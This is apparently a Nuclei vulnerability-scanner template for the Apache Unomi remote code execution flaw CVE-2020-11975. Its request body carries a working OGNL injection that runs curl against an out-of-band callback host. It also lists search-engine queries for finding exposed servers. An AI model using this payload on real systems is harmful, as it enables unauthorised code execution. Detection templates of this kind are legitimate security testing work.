http:
- body: "{\n  \"personalizations\":[\n    {\n      \"id\":\"gender-test_anystr\",\n\
    \      \"strategy\":\"matching-first\",\n      \"strategyOptions\":{\n       \
    \ \"fallback\":\"var2\"\n      },\n      \"contents\":[\n        {\n         \
    \ \"filters\":[\n            {\n              \"condition\":{\n              \
    \  \"parameterValues\":{\n                  \"propertyName\":\"(#r=@java.lang.Runtime@getRuntime()).(#r.exec(\\\
    \"curl {{interactsh-url}}\\\"))\",\n                  \"comparisonOperator\":\"\
    equals_anystr\",\n                  \"propertyValue\":\"male_anystr\"\n      \
    \          },\n                \"type\":\"profilePropertyCondition\"\n       \
    \       }\n            }\n          ]\n        }\n      ]\n    }\n  ],\n  \"sessionId\"\
    :\"test-demo-session-id\"\n}\n"
  headers:
    Content-Type: application/json
  matchers:
  - part: interactsh_protocol
    type: word
    words:
    - dns
  - condition: and
    dsl:
    - contains_all(body, "profileId\":", "sessionId\":")
    - contains(content_type, "application/json")
    - status_code == 200 || status_code == 500
    type: dsl
  matchers-condition: and
  method: POST
  path:
  - '{{BaseURL}}/context.json'
id: CVE-2020-11975
info:
  author: Sourabh-Sahu
  classification:
    cpe: cpe:2.3:a:apache:unomi:*:*:*:*:*:*:*:*
    cve-id: CVE-2020-11975
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-94
    epss-percentile: 0.992
    epss-score: 0.8271
  description: 'Apache Unomi allows conditions to use OGNL scripting which offers
    the possibility to call static Java classes from the JDK that could execute code
    with the permission level of the running Java process, enabling attackers to execute
    arbitrary code.

    '
  impact: 'Successful exploitation allows an attacker to execute arbitrary code on
    the server with the privileges of the Java process, potentially leading to complete
    system compromise.

    '
  metadata:
    fofa-query: title="Apache Unomi"
    max-request: 1
    product: unomi
    shodan-query: http.title:"Apache Unomi"
    vendor: apache
    verified: true
  name: Apache Unomi - Remote Code Execution
  reference:
  - https://xz.aliyun.com/news/8157
  - https://github.com/1135/unomi_exploit
  - https://unomi.apache.org/security/cve-2020-11975.html
  - https://nvd.nist.gov/vuln/detail/CVE-2020-11975
  remediation: 'Update Apache Unomi to version 1.5.2 or later. Disable OGNL scripting
    in conditions if not required.

    '
  severity: critical
  tags: cve,cve2020,apache,unomi,rce,ognl,oast,vkev,vuln
